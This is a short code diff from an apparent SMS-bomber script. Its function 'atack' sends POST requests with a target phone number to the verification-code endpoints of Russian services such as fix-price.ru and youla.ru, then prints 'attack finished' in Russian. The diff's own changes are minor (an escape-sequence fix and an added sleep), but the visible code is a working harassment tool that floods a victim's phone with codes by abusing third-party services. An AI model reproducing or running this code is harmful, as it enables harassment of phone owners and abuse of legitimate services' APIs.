@@ -123,7 +123,7 @@ def atack():
     delay()
 
     a  = requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-    print("\\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
+    print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
     delay()
 
     a  = requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone})
@@ -136,7 +136,7 @@ def atack():
 
 
 
-
+    time.sleep(2)
     logo()
     print("\u001b[33m[+]\u001b[32m Атака завершена!")
     time.sleep(2)
